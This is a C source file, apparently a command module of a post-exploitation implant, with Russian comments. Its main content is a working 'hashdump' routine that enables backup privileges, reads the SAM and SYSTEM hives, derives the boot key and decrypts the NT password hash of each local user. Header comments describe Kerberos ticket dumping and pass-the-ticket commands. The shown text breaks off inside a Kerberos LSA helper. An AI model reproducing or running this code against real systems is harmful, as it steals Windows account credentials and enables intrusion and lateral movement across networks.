// Hash dump + Kerberos ticket commands.
//
// hashdump:    включает SeBackupPrivilege и сохраняет HKLM\SAM, HKLM\SYSTEM,
//              HKLM\SECURITY в %TEMP% через RegSaveKeyExW. Парсинг хивов
//              делается оператором офлайн (impacket secretsdump.py / mimikatz).
// ticket_list: KerbQueryTicketCacheMessage — перечисляет билеты текущей
//              сессии (или ListTickets через Lsa если процесс с SeTcbPrivilege).
// ticket_dump: KerbRetrieveEncodedTicketMessage — извлекает .kirbi-блоб.
// ticket_use:  KerbSubmitTicketMessage — pass-the-ticket в текущую сессию.
// ticket_purge:KerbPurgeTicketCacheMessage — очистка кеша билетов.
//
// Линкуется secur32 (LsaCallAuthenticationPackage) + advapi32.

// winternl.h (через beacon.h) определяет UNICODE_STRING/STRING без проверки
// _NTDEF_. Включаем его первым, затем ставим _NTDEF_ чтобы ntsecapi.h
// пропустил эти типы. PNTSTATUS нет в winnt.h, добавляем вручную.
#include <windows.h>
#include <winternl.h>
#define _NTDEF_
typedef NTSTATUS *PNTSTATUS;
#include <ntsecapi.h>
#include <bcrypt.h>
#include "../core/beacon.h"

// ---- общие хелперы ---------------------------------------------------------

static void out_str(const char* s) { out_write(s, rt_strlen(s)); }

static int fmt_u32(char* out, uint32_t v) {
    char tmp[16]; int n = 0;
    if (!v) { out[0] = '0'; out[1] = 0; return 1; }
    while (v) { tmp[n++] = (char)('0' + v % 10); v /= 10; }
    int i = 0; while (n) out[i++] = tmp[--n]; out[i] = 0;
    return i;
}

static int fmt_hex64(char* out, uint64_t v) {
    static const char hx[] = "0123456789abcdef";
    out[0] = '0'; out[1] = 'x';
    int i = 2; int started = 0;
    for (int s = 60; s >= 0; s -= 4) {
        uint8_t n = (uint8_t)((v >> s) & 0xF);
        if (n || started || s == 0) { out[i++] = hx[n]; started = 1; }
    }
    out[i] = 0; return i;
}

static void wide_to_utf8_out(const wchar_t* w, int wlen) {
    if (wlen <= 0) return;
    int n = WideCharToMultiByte(CP_UTF8, 0, w, wlen, NULL, 0, NULL, NULL);
    if (n <= 0) return;
    uint8_t* b = (uint8_t*)bmalloc((size_t)n);
    if (!b) return;
    WideCharToMultiByte(CP_UTF8, 0, w, wlen, (LPSTR)b, n, NULL, NULL);
    out_write(b, (size_t)n);
    bfree(b);
}

static int enable_privilege(LPCWSTR name) {
    HANDLE tok = NULL;
    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &tok)) return -1;
    LUID luid;
    if (!LookupPrivilegeValueW(NULL, name, &luid)) { CloseHandle(tok); return -1; }
    TOKEN_PRIVILEGES tp = { 0 };
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    BOOL ok = AdjustTokenPrivileges(tok, FALSE, &tp, sizeof(tp), NULL, NULL);
    DWORD le = GetLastError();
    CloseHandle(tok);
    return (ok && le == ERROR_SUCCESS) ? 0 : -1;
}

// ---- cmd_hashdump (inline SAM parsing, AES format, Vista+) ----------------

// SYSKEY permutation: raw bytes from JD/Skew1/GBG/Data class names → bootkey
static const uint8_t kSysKeyPerm[16] = {
    8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7
};

// NT hash of the empty password
static const uint8_t kBlankNTHash[16] = {
    0x31,0xd6,0xcf,0xe0,0xd1,0x6a,0xe9,0x31,
    0xb7,0x3c,0x59,0xd7,0xe0,0xc0,0x89,0xc0
};

static int hd_hex_nibble(wchar_t c) {
    if (c >= L'0' && c <= L'9') return c - L'0';
    if (c >= L'A' && c <= L'F') return c - L'A' + 10;
    if (c >= L'a' && c <= L'f') return c - L'a' + 10;
    return -1;
}

// Concatenate two wide strings into dst (dst must be large enough).
static void hd_wcat(wchar_t* dst, const wchar_t* a, const wchar_t* b) {
    int i = 0, j;
    for (j = 0; a[j]; j++) dst[i++] = a[j];
    for (j = 0; b[j]; j++) dst[i++] = b[j];
    dst[i] = 0;
}

// Write 16 bytes as 32 lowercase hex chars.
static void hd_out_hex16(const uint8_t* b) {
    static const char h[] = "0123456789abcdef";
    char buf[33];
    for (int i = 0; i < 16; i++) {
        buf[i*2]   = h[b[i] >> 4];
        buf[i*2+1] = h[b[i] & 0xF];
    }
    buf[32] = 0;
    out_str(buf);
}

// AES-128-CBC decrypt via BCrypt (already linked in CMakeLists).
// in_len must be a multiple of 16.
static BOOL hd_aes128cbc(const uint8_t key[16], const uint8_t iv[16],
                          const uint8_t* in, DWORD in_len, uint8_t* out) {
    if (!in_len || (in_len & 15)) return FALSE;
    BCRYPT_ALG_HANDLE alg = NULL;
    BCRYPT_KEY_HANDLE hk  = NULL;
    BOOL ok = FALSE;
    if (BCryptOpenAlgorithmProvider(&alg, BCRYPT_AES_ALGORITHM, NULL, 0)) goto end;
    if (BCryptSetProperty(alg, BCRYPT_CHAINING_MODE,
                          (PUCHAR)BCRYPT_CHAIN_MODE_CBC,
                          sizeof(BCRYPT_CHAIN_MODE_CBC), 0)) goto end;
    if (BCryptGenerateSymmetricKey(alg, &hk, NULL, 0, (PUCHAR)key, 16, 0)) goto end;
    {
        uint8_t iv_tmp[16];
        rt_memcpy(iv_tmp, iv, 16);
        ULONG done = 0;
        ok = (BCryptDecrypt(hk, (PUCHAR)in, in_len, NULL,
                            iv_tmp, 16, out, in_len, &done, 0) == 0);
    }
end:
    if (hk)  BCryptDestroyKey(hk);
    if (alg) BCryptCloseAlgorithmProvider(alg, 0);
    return ok;
}

// Derive SYSKEY (bootkey) from live HKLM\SYSTEM (readable without special privileges).
// The key is encoded in the class names of four subkeys of Lsa:
//   JD / Skew1 / GBG / Data — each contributes 4 bytes (8 hex wchars).
static int hd_get_syskey(uint8_t out[16]) {
    static const wchar_t* kParts[4] = { L"JD", L"Skew1", L"GBG", L"Data" };
    static const wchar_t  kBase[]   = L"SYSTEM\\CurrentControlSet\\Control\\Lsa\\";
    uint8_t raw[16];
    int     pos = 0;
    for (int i = 0; i < 4; i++) {
        wchar_t path[96];
        hd_wcat(path, kBase, kParts[i]);
        HKEY hk = NULL;
        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, path, 0, KEY_READ, &hk))
            return -1;
        wchar_t cls[32];
        rt_memset(cls, 0, sizeof(cls));
        DWORD cls_len = 32;
        RegQueryInfoKeyW(hk, cls, &cls_len, NULL,
                         NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
        RegCloseKey(hk);
        if (cls_len < 8) return -1;
        for (int j = 0; j < 4; j++) {
            int hi = hd_hex_nibble(cls[j * 2]);
            int lo = hd_hex_nibble(cls[j * 2 + 1]);
            if (hi < 0 || lo < 0) return -1;
            raw[pos++] = (uint8_t)((hi << 4) | lo);
        }
    }
    for (int i = 0; i < 16; i++) out[i] = raw[kSysKeyPerm[i]];
    return 0;
}

// Derive HBootKey from the F value in the loaded SAM hive (_hm\SAM\Domains\Account).
// SAM_KEY_DATA_AES layout at F[0x68] (revision == 2, Vista+):
//   +0  u16 Revision = 0x0002
//   +2  u16 Length
//   +4  u32 CheckLength
//   +8  u8[16] Salt      → F[0x70]
//   +24 u8[16] Key       → F[0x80]
//   +40 u8[16] CheckSum  → F[0x90]
// Decrypt: AES-128-CBC(syskey, Salt, Key||CheckSum) → first 16 bytes = HBootKey.
static int hd_get_hbootkey(const uint8_t syskey[16], uint8_t hbootkey[16]) {
    HKEY hk = NULL;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                      L"_hm\\SAM\\Domains\\Account",
                      0, KEY_READ, &hk)) return -1;
    DWORD f_len = 0;
    RegQueryValueExW(hk, L"F", NULL, NULL, NULL, &f_len);
    if (f_len < 0xA0) { RegCloseKey(hk); return -1; }
    uint8_t* f = (uint8_t*)bmalloc(f_len);
    if (!f) { RegCloseKey(hk); return -1; }
    LSTATUS s = RegQueryValueExW(hk, L"F", NULL, NULL, f, &f_len);
    RegCloseKey(hk);
    if (s) { bfree(f); return -1; }
    int ret = -1;
    uint16_t rev = 0;
    rt_memcpy(&rev, f + 0x68, 2);
    if (rev == 2) {
        uint8_t enc[32];
        rt_memcpy(enc,      f + 0x80, 16);   // Key
        rt_memcpy(enc + 16, f + 0x90, 16);   // CheckSum
        uint8_t dec[32];
        if (hd_aes128cbc(syskey, f + 0x70, enc, 32, dec)) {
            rt_memcpy(hbootkey, dec, 16);
            ret = 0;
        }
    } else {
        out_str("[!] SAM key revision != 2 (pre-Vista RC4 not supported)\n");
    }
    bfree(f);
    return ret;
}

// Decrypt and print one SAM user in secretsdump format: user:RID:LM:NT:::
// V block layout (all u32 LE offsets relative to V[0xCC]):
//   [0x0C] name_offset  [0x10] name_len (bytes, UTF-16LE)
//   [0xA8] nt_off       [0xAC] nt_len  (0=blank, 56=AES, 20=RC4)
// SAM_HASH_AES at V[0xCC + nt_off]:
//   +0 u16 PekID=0x0002  +2 u16 Rev  +4 u32 DataOff
//   +8 u8[16] Salt  +24 u8[32] EncData
// NT hash = AES-128-CBC(HBootKey, Salt, EncData[0:32])[0:16]
static void hd_dump_user(const wchar_t* rid_hex8, const uint8_t hbootkey[16]) {
    uint32_t rid = 0;
    for (int i = 0; i < 8 && rid_hex8[i]; i++) {
        int n = hd_hex_nibble(rid_hex8[i]);
        if (n < 0) return;
        rid = (rid << 4) | (uint32_t)n;
    }
    wchar_t path[96];
    hd_wcat(path, L"_hm\\SAM\\Domains\\Account\\Users\\", rid_hex8);
    HKEY hk = NULL;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, path, 0, KEY_READ, &hk)) return;
    DWORD v_len = 0;
    RegQueryValueExW(hk, L"V", NULL, NULL, NULL, &v_len);
    if (v_len < 0xCC + 4) { RegCloseKey(hk); return; }
    uint8_t* v = (uint8_t*)bmalloc(v_len);
    if (!v) { RegCloseKey(hk); return; }
    LSTATUS s = RegQueryValueExW(hk, L"V", NULL, NULL, v, &v_len);
    RegCloseKey(hk);
    if (s) { bfree(v); return; }

    uint32_t name_off = 0, name_len = 0;
    rt_memcpy(&name_off, v + 0x0C, 4);
    rt_memcpy(&name_len, v + 0x10, 4);
    uint32_t nt_off = 0, nt_len = 0;
    rt_memcpy(&nt_off, v + 0xA8, 4);
    rt_memcpy(&nt_len, v + 0xAC, 4);

    // username
    if (name_len && 0xCC + name_off + name_len <= v_len)
        wide_to_utf8_out((wchar_t*)(v + 0xCC + name_off), (int)(name_len / 2));
    else
        out_str("?");
    out_str(":");

    // RID
    char rid_str[12];
    out_write(rid_str, (size_t)fmt_u32(rid_str, rid));
    out_str(":");

    // LM — always empty on Vista+
    out_str("aad3b435b51404eeaad3b435b51404ee:");

    // NT hash
    if (nt_len == 0) {
        hd_out_hex16(kBlankNTHash);
    } else if (nt_len >= 56 && 0xCC + nt_off + nt_len <= v_len) {
        const uint8_t* enc = v + 0xCC + nt_off;
        uint16_t pek_id = 0;
        rt_memcpy(&pek_id, enc, 2);
        if (pek_id == 2) {
            uint8_t dec[32];
            if (hd_aes128cbc(hbootkey, enc + 8, enc + 24, 32, dec))
                hd_out_hex16(dec);
            else
                out_str("????????????????????????????????");
        } else {
            out_str("????????????????????????????????");  // old RC4, not implemented
        }
    } else {
        out_str("????????????????????????????????");
    }
    out_str(":::\n");
    bfree(v);
}

static void hd1_run(void) {
    if (enable_privilege(L"SeBackupPrivilege") != 0) {
        out_str("error: SeBackupPrivilege unavailable (need SYSTEM/elevated)\n");
        return;
    }
    enable_privilege(L"SeRestorePrivilege");

    // SYSKEY from live HKLM\SYSTEM — world-readable, no special rights needed.
    uint8_t syskey[16];
    if (hd_get_syskey(syskey) != 0) {
        out_str("error: failed to read SYSKEY\n");
        return;
    }

    // Save SAM hive to a temp file (SeBackupPrivilege bypasses DACL).
    wchar_t tmp_dir[MAX_PATH];
    DWORD td = GetTempPathW(MAX_PATH, tmp_dir);
    if (!td || td >= MAX_PATH - 20) { out_str("error: GetTempPathW\n"); return; }
    wchar_t sam_path[MAX_PATH];
    hd_wcat(sam_path, tmp_dir, L"~co2hsa.tmp");
    DeleteFileW(sam_path);
    HKEY hk_sam = NULL;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SAM", 0, KEY_READ, &hk_sam)) {
        out_str("error: open SAM key (need SYSTEM)\n"); return;
    }
    LSTATUS rs = RegSaveKeyExW(hk_sam, sam_path, NULL, REG_LATEST_FORMAT);
    RegCloseKey(hk_sam);
    if (rs) { out_str("error: RegSaveKeyExW SAM\n"); return; }

    // Mount the saved hive under HKLM\_hm.
    RegUnLoadKeyW(HKEY_LOCAL_MACHINE, L"_hm");   // clear any leftover
    rs = RegLoadKeyW(HKEY_LOCAL_MACHINE, L"_hm", sam_path);
    if (rs) {
        out_str("error: RegLoadKeyW (need SeRestorePrivilege)\n");
        DeleteFileW(sam_path);
        return;
    }

    // Derive HBootKey from the loaded hive.
    uint8_t hbootkey[16];
    if (hd_get_hbootkey(syskey, hbootkey) != 0) {
        out_str("error: hd_get_hbootkey failed\n");
        goto cleanup;
    }

    out_str("[*] SAM hashes\n");

    // Enumerate user subkeys (8-char hex RIDs) under ...\\Users\\.
    HKEY hk_users = NULL;
    RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                  L"_hm\\SAM\\Domains\\Account\\Users",
                  0, KEY_READ, &hk_users);
    if (!hk_users) { out_str("error: open Users key\n"); goto cleanup; }
    for (DWORD idx = 0; ; idx++) {
        wchar_t sub[32];
        DWORD sub_len = 32;
        if (RegEnumKeyExW(hk_users, idx, sub, &sub_len,
                          NULL, NULL, NULL, NULL) != ERROR_SUCCESS) break;
        if (sub_len != 8) continue;  // skip "Names" subkey
        hd_dump_user(sub, hbootkey);
    }
    RegCloseKey(hk_users);

cleanup:
    RegUnLoadKeyW(HKEY_LOCAL_MACHINE, L"_hm");
    DeleteFileW(sam_path);
}

// ---- cmd_hashdump mode 2: прямое чтение SAM через SeBackupPrivilege -------
// Полная расшифровка NT-хешей: AES (Win10+) и RC4 (legacy) + DES-обёртка RID.
// Чтение SAM напрямую через REG_OPTION_BACKUP_RESTORE без сохранения хива.

// Константы для RC4 расшифровки (legacy pre-Vista SAM)
static const char hd2_aqwerty[] = "!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%";
static const char hd2_anum[]    = "0123456789012345678901234567890123456789";
static const char hd2_ntpw[]    = "NTPASSWORD";

// Вывести N байт как hex-строку в буфер вывода бикона
static void hd2_out_hex(const uint8_t* d, size_t n) {
    static const char h[] = "0123456789abcdef";
    char buf[64];
    size_t bi = 0;
    for (size_t i = 0; i < n; i++) {
        buf[bi++] = h[d[i] >> 4];
        buf[bi++] = h[d[i] & 0xF];
        if (bi >= sizeof(buf) - 2) { out_write(buf, bi); bi = 0; }
    }
    if (bi) out_write(buf, bi);
}

// MD5 через BCrypt (до 4 блоков данных)
static BOOL hd2_md5(const uint8_t* p1, ULONG l1,
                    const uint8_t* p2, ULONG l2,
                    const uint8_t* p3, ULONG l3,
                    const uint8_t* p4, ULONG l4,
                    uint8_t out[16]) {
    BCRYPT_ALG_HANDLE alg = NULL;
    BCRYPT_HASH_HANDLE h  = NULL;
    BOOL ok = FALSE;
    if (BCryptOpenAlgorithmProvider(&alg, BCRYPT_MD5_ALGORITHM, NULL, 0) == 0 &&
        BCryptCreateHash(alg, &h, NULL, 0, NULL, 0, 0) == 0) {
        BCryptHashData(h, (PUCHAR)p1, l1, 0);
        if (p2) BCryptHashData(h, (PUCHAR)p2, l2, 0);
        if (p3) BCryptHashData(h, (PUCHAR)p3, l3, 0);
        if (p4) BCryptHashData(h, (PUCHAR)p4, l4, 0);
        BCryptFinishHash(h, out, 16, 0);
        ok = TRUE;
    }
    if (h)   BCryptDestroyHash(h);
    if (alg) BCryptCloseAlgorithmProvider(alg, 0);
    return ok;
}

// RC4 in-place через BCrypt
static BOOL hd2_rc4(const uint8_t* key, ULONG kl, uint8_t* buf, ULONG bl) {
    BCRYPT_ALG_HANDLE alg = NULL;
    BCRYPT_KEY_HANDLE k   = NULL;
    BOOL ok = FALSE;
    ULONG cb;
    if (BCryptOpenAlgorithmProvider(&alg, BCRYPT_RC4_ALGORITHM, NULL, 0) == 0 &&
        BCryptGenerateSymmetricKey(alg, &k, NULL, 0, (PUCHAR)key, kl, 0) == 0) {
        BCryptEncrypt(k, buf, bl, NULL, NULL, 0, buf, bl, &cb, 0);
        ok = TRUE;
    }
    if (k)   BCryptDestroyKey(k);
    if (alg) BCryptCloseAlgorithmProvider(alg, 0);
    return ok;
}

// AES-128-CBC in-place через BCrypt
static BOOL hd2_aes_cbc(const uint8_t key[16], const uint8_t iv[16],
                         uint8_t* buf, ULONG bl) {
    BCRYPT_ALG_HANDLE alg = NULL;
    BCRYPT_KEY_HANDLE k   = NULL;
    BOOL ok = FALSE;
    ULONG cb;
    uint8_t iv_copy[16];
    if (BCryptOpenAlgorithmProvider(&alg, BCRYPT_AES_ALGORITHM, NULL, 0) == 0) {
        BCryptSetProperty(alg, BCRYPT_CHAINING_MODE,
                          (PUCHAR)BCRYPT_CHAIN_MODE_CBC,
                          sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
        if (BCryptGenerateSymmetricKey(alg, &k, NULL, 0, (PUCHAR)key, 16, 0) == 0) {
            rt_memcpy(iv_copy, iv, 16);
            BCryptDecrypt(k, buf, bl, NULL, iv_copy, 16, buf, bl, &cb, 0);
            ok = TRUE;
        }
    }
    if (k)   BCryptDestroyKey(k);
    if (alg) BCryptCloseAlgorithmProvider(alg, 0);
    return ok;
}

// DES-ECB дешифровка одного 8-байтного блока
static BOOL hd2_des(const uint8_t key[8], uint8_t block[8]) {
    BCRYPT_ALG_HANDLE alg = NULL;
    BCRYPT_KEY_HANDLE k   = NULL;
    BOOL ok = FALSE;
    ULONG cb;
    if (BCryptOpenAlgorithmProvider(&alg, BCRYPT_DES_ALGORITHM, NULL, 0) == 0) {
        BCryptSetProperty(alg, BCRYPT_CHAINING_MODE,
                          (PUCHAR)BCRYPT_CHAIN_MODE_ECB,
                          sizeof(BCRYPT_CHAIN_MODE_ECB), 0);
        if (BCryptGenerateSymmetricKey(alg, &k, NULL, 0, (PUCHAR)key, 8, 0) == 0) {
            BCryptDecrypt(k, block, 8, NULL, NULL, 0, block, 8, &cb, 0);
            ok = TRUE;
        }
    }
    if (k)   BCryptDestroyKey(k);
    if (alg) BCryptCloseAlgorithmProvider(alg, 0);
    return ok;
}

// 7 байт → 8-байтный DES-ключ (7 бит данных + 1 бит чётности на байт)
static void hd2_str_to_key(const uint8_t in7[7], uint8_t out8[8]) {
    out8[0] =   in7[0] >> 1;
    out8[1] = ((in7[0] & 0x01) << 6) | (in7[1] >> 2);
    out8[2] = ((in7[1] & 0x03) << 5) | (in7[2] >> 3);
    out8[3] = ((in7[2] & 0x07) << 4) | (in7[3] >> 4);
    out8[4] = ((in7[3] & 0x0F) << 3) | (in7[4] >> 5);
    out8[5] = ((in7[4] & 0x1F) << 2) | (in7[5] >> 6);
    out8[6] = ((in7[5] & 0x3F) << 1) | (in7[6] >> 7);
    out8[7] =   in7[6] & 0x7F;
    for (int i = 0; i < 8; i++) out8[i] = (uint8_t)((out8[i] << 1) & 0xFE);
}

// RID → два DES-ключа для снятия внешней обёртки NT-хеша
static void hd2_rid_to_des(uint32_t rid, uint8_t k1[8], uint8_t k2[8]) {
    uint8_t r[4];
    rt_memcpy(r, &rid, 4);
    uint8_t p1[7], p2[7];
    p1[0] = r[0]; p1[1] = r[1]; p1[2] = r[2]; p1[3] = r[3];
    p1[4] = r[0]; p1[5] = r[1]; p1[6] = r[2];
    p2[0] = r[3]; p2[1] = r[0]; p2[2] = r[1]; p2[3] = r[2];
    p2[4] = r[3]; p2[5] = r[0]; p2[6] = r[1];
    hd2_str_to_key(p1, k1);
    hd2_str_to_key(p2, k2);
}

// Дешифровать NT-хеш одного пользователя (AES/RC4 + DES unwrap)
static BOOL hd2_decrypt_nt(const uint8_t hbk[16], BOOL isAes,
                            uint32_t rid, const uint8_t* blob, DWORD blen,
                            uint8_t nt[16]) {
    uint8_t inner[16];
    if (isAes) {
        // SAM_HASH_AES: PekID(2)+Rev(2)+DataOff(4)+Salt(16)+Hash(16+)
        if (blen < 40) { rt_memcpy(nt, kBlankNTHash, 16); return TRUE; }
        uint8_t iv[16];
        rt_memcpy(iv, blob + 8, 16);
        rt_memcpy(inner, blob + 24, 16);
        if (!hd2_aes_cbc(hbk, iv, inner, 16)) return FALSE;
    } else {
        // Legacy: 4-byte header + 16 bytes RC4-encrypted
        if (blen < 20) return FALSE;
        uint8_t rc4key[16];
        uint32_t rid_le = rid;
        if (!hd2_md5(hbk, 16,
                     (uint8_t*)&rid_le, sizeof(rid_le),
                     (uint8_t*)hd2_ntpw, (ULONG)sizeof(hd2_ntpw),
                     NULL, 0, rc4key))
            return FALSE;
        rt_memcpy(inner, blob + 4, 16);
        if (!hd2_rc4(rc4key, 16, inner, 16)) return FALSE;
    }
    // Снять DES-обёртку по RID
    uint8_t k1[8], k2[8];
    hd2_rid_to_des(rid, k1, k2);
    uint8_t h1[8], h2[8];
    rt_memcpy(h1, inner, 8);
    rt_memcpy(h2, inner + 8, 8);
    if (!hd2_des(k1, h1) || !hd2_des(k2, h2)) return FALSE;
    rt_memcpy(nt, h1, 8);
    rt_memcpy(nt + 8, h2, 8);
    return TRUE;
}

// Открыть ключ реестра с SeBackupPrivilege (REG_OPTION_BACKUP_RESTORE)
static LONG hd2_open_backup(HKEY root, const wchar_t* sub, HKEY* out) {
    DWORD disp;
    return RegCreateKeyExW(root, sub, 0, NULL,
                           REG_OPTION_BACKUP_RESTORE,
                           KEY_READ | KEY_WOW64_64KEY,
                           NULL, out, &disp);
}

// HBootKey из SAM\SAM\Domains\Account[F] (через backup privilege).
// Поддерживает AES (Win10+, revision>=3) и RC4 (legacy, revision<3).
static int hd2_get_hbootkey(const uint8_t bootkey[16],
                             uint8_t hbootkey[16], BOOL* isAes) {
    HKEY hk;
    if (hd2_open_backup(HKEY_LOCAL_MACHINE,
                        L"SAM\\SAM\\Domains\\Account", &hk) != ERROR_SUCCESS) {
        out_str("[-] open SAM\\Domains\\Account failed\n");
        return -1;
    }
    uint8_t F[1024];
    DWORD F_len = sizeof(F);
    LONG rc = RegQueryValueExW(hk, L"F", NULL, NULL, F, &F_len);
    RegCloseKey(hk);
    if (rc != ERROR_SUCCESS) { out_str("[-] read F failed\n"); return -1; }

    *isAes = (F[0] >= 3);
    if (*isAes) {
        // SAM_KEY_DATA_AES at offset 0x78: +8 Salt(16) +24 Data(32)
        if (F_len < 0x78 + 24 + 32) { out_str("[-] F too small for AES\n"); return -1; }
        uint8_t buf[32];
        rt_memcpy(buf, F + 0x78 + 24, 32);
        if (!hd2_aes_cbc(bootkey, F + 0x78 + 8, buf, 32)) return -1;
        rt_memcpy(hbootkey, buf, 16);
    } else {
        // Legacy RC4: salt at 0x70, encrypted blob at 0x80
        if (F_len < 0xA0) { out_str("[-] F too small for RC4\n"); return -1; }
        uint8_t rc4key[16];
        if (!hd2_md5(F + 0x70, 16,
                     (uint8_t*)hd2_aqwerty, sizeof(hd2_aqwerty) - 1,
                     bootkey, 16,
                     (uint8_t*)hd2_anum, sizeof(hd2_anum) - 1,
                     rc4key)) return -1;
        uint8_t buf[32];
        rt_memcpy(buf, F + 0x80, 32);
        if (!hd2_rc4(rc4key, 16, buf, 32)) return -1;
        rt_memcpy(hbootkey, buf, 16);
    }
    return 0;
}

// Вывести wide-строку + паддинг пробелами до pad символов
static void hd2_out_wpad(const wchar_t* w, int wlen, int pad) {
    int n = 0;
    if (w && wlen > 0) {
        n = WideCharToMultiByte(CP_UTF8, 0, w, wlen, NULL, 0, NULL, NULL);
        if (n > 0) {
            char* buf = (char*)bmalloc((size_t)n);
            if (buf) {
                WideCharToMultiByte(CP_UTF8, 0, w, wlen, buf, n, NULL, NULL);
                out_write(buf, (size_t)n);
                bfree(buf);
            }
        } else {
            n = 0;
        }
    }
    for (int i = n; i < pad; i++) out_write(" ", 1);
}

// Перечислить и вывести все SAM-записи (формат таблицы как в hashdump2.c)
static BOOL hd2_dump_users(const uint8_t hbk[16], BOOL isAes) {
    HKEY hUsers;
    if (hd2_open_backup(HKEY_LOCAL_MACHINE,
        L"SAM\\SAM\\Domains\\Account\\Users", &hUsers) != ERROR_SUCCESS) {
        out_str("[-] open Users key failed\n");
        return FALSE;
    }
    out_str("\n    USER                 RID    NTLM\n");
    out_str("    -------------------- ------ --------------------------------\n");

    for (DWORD idx = 0; ; idx++) {
        wchar_t sub[64];
        DWORD sub_len = 64;
        LONG rc = RegEnumKeyExW(hUsers, idx, sub, &sub_len,
                                NULL, NULL, NULL, NULL);
        if (rc == ERROR_NO_MORE_ITEMS) break;
        if (rc != ERROR_SUCCESS) continue;
        if (sub_len != 8) continue;   // пропускаем Names и прочие подключи

        uint32_t rid = 0;
        int bad = 0;
        for (DWORD i = 0; i < 8 && sub[i]; i++) {
            int nibble = hd_hex_nibble(sub[i]);
            if (nibble < 0) { bad = 1; break; }
            rid = (rid << 4) | (uint32_t)nibble;
        }
        if (bad) continue;

        HKEY hUser;
        if (hd2_open_backup(hUsers, sub, &hUser) != ERROR_SUCCESS) continue;

        DWORD V_len = 0;
        RegQueryValueExW(hUser, L"V", NULL, NULL, NULL, &V_len);
        if (V_len < 0xCC) { RegCloseKey(hUser); continue; }
        uint8_t* V = (uint8_t*)bmalloc(V_len);
        if (!V) { RegCloseKey(hUser); continue; }
        rc = RegQueryValueExW(hUser, L"V", NULL, NULL, V, &V_len);
        RegCloseKey(hUser);
        if (rc != ERROR_SUCCESS) { bfree(V); continue; }

        uint32_t un_off, un_len, nh_off, nh_len;
        rt_memcpy(&un_off, V + 0x0C, 4);
        rt_memcpy(&un_len, V + 0x10, 4);
        rt_memcpy(&nh_off, V + 0xA8, 4);
        rt_memcpy(&nh_len, V + 0xAC, 4);

        // Имя пользователя (UTF-16LE → UTF-8) с паддингом до 21 символа
        out_str("    ");
        if (un_len && 0xCC + un_off + un_len <= V_len)
            hd2_out_wpad((wchar_t*)(V + 0xCC + un_off), (int)(un_len / 2), 21);
        else
            hd2_out_wpad(L"?", 1, 21);

        // RID с паддингом до 7 символов
        char rs[12];
        int rl = fmt_u32(rs, rid);
        out_write(rs, (size_t)rl);
        for (int p = rl; p < 7; p++) out_write(" ", 1);

        // NT hash (полная расшифровка включая DES-обёртку)
        uint8_t nt[16];
        rt_memset(nt, 0, 16);
        BOOL got = FALSE;
        if (nh_len > 0 && 0xCC + nh_off + nh_len <= V_len)
            got = hd2_decrypt_nt(hbk, isAes, rid,
                                  V + 0xCC + nh_off, nh_len, nt);
        if (got) hd2_out_hex(nt, 16);
        else     out_str("<empty / decrypt failed>");
        out_str("\n");
        bfree(V);
    }
    RegCloseKey(hUsers);
    return TRUE;
}

// Точка входа mode 2: прямое чтение SAM через SeBackupPrivilege
static void hd2_run(void) {
    if (enable_privilege(L"SeBackupPrivilege") != 0) {
        out_str("error: SeBackupPrivilege unavailable (need Admin/SYSTEM)\n");
        return;
    }
    enable_privilege(L"SeRestorePrivilege");

    // SYSKEY (bootkey) — читается из HKLM\SYSTEM без привилегий
    uint8_t bootkey[16];
    if (hd_get_syskey(bootkey) != 0) {
        out_str("error: failed to read BootKey\n");
        return;
    }
    out_str("[+] BootKey:  ");
    hd2_out_hex(bootkey, 16);
    out_str("\n");

    // HBootKey из SAM
    uint8_t hbootkey[16];
    BOOL isAes = FALSE;
    if (hd2_get_hbootkey(bootkey, hbootkey, &isAes) != 0) return;
    out_str("[+] HBootKey: ");
    hd2_out_hex(hbootkey, 16);
    out_str("\n[*] SAM revision: ");
    out_str(isAes ? "AES (Win10+)" : "RC4 (legacy)");
    out_str("\n");

    hd2_dump_users(hbootkey, isAes);
}

// ---- cmd_hashdump — диспетчер по аргументу --------------------------------

void cmd_hashdump(const BeaconTask* t) {
    // "2" = прямое чтение SAM через backup privilege + полный decrypt с DES
    // "1" или без аргумента = сохранение хива во временный файл + reload
    if (t->pay && t->pay_len >= 1 && t->pay[0] == '2')
        hd2_run();
    else
        hd1_run();
}

// ---- Kerberos: helpers через LsaCallAuthenticationPackage ------------------

typedef NTSTATUS (NTAPI *fn_LsaConnectUntrusted)(PHANDLE);
typedef NTSTATUS (NTAPI *fn_LsaLookupAuthenticationPackage)(HANDLE, PLSA_STRING, PULONG);
typedef NTSTATUS (NTAPI *fn_LsaCallAuthenticationPackage)(HANDLE, ULONG, PVOID, ULONG, PVOID*, PULONG, PNTSTATUS);
typedef NTSTATUS (NTAPI *fn_LsaFreeReturnBuffer)(PVOID);
typedef NTSTATUS (NTAPI *fn_LsaDeregisterLogonProcess)(HANDLE);

static int lsa_connect(HANDLE* out_lsa, ULONG* out_pkg) {
    HMODULE m = LoadLibraryA("secur32.dll");
    if (!m) return -1;
    fn_LsaConnectUntrusted pConnect =
        (fn_LsaConnectUntrusted)GetProcAddress(m, "LsaConnectUntrusted");
    fn_LsaLookupAuthenticationPackage pLookup =
        (fn_LsaLookupAuthenticationPackage)GetProcAddress(m, "LsaLookupAuthenticationPackage");
    if (!pConnect || !pLookup) return -1;

    HANDLE h = NULL;
    if (pConnect(&h) < 0 || !h) return -1;

    LSA_STRING name;
    static const char kerb[] = MICROSOFT_KERBEROS_NAME_A;
    name.Buffer = (PCHAR)kerb;
    name.Length = (USHORT)(sizeof(kerb) - 1);
    name.MaximumLength = (USHORT)sizeof(kerb);
    ULONG pkg = 0;
    if (pLookup(h, &name, &pkg) < 0) {
        fn_LsaDeregisterLogonProcess pDereg =
            (fn_LsaDeregisterLogonProcess)GetProcAddress(m, "LsaDeregisterLogonProcess");
        if (pDereg) pDereg(h);
        return -1;
    }
